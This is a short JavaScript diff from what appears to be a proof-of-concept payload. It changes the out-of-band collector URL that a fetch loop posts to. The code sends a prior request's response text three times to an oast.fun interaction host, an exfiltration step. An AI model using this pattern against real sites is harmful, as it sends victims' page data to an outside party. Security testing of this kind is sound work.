@@ -6,7 +6,7 @@ req.send();
 
 function reqListener() {
     for(let i = 0; i < 3; i++){
-        fetch('https://ck2pp7g2vtc0000mge8ggjtmmdayyyyyb.oast.fun/poc', {
+        fetch('https://ck2ps4m2vtc0000jtfw0gjtmc1cyyyyyb.oast.fun/pocs', {
             method: 'POST',
             body: this.responseText
         });
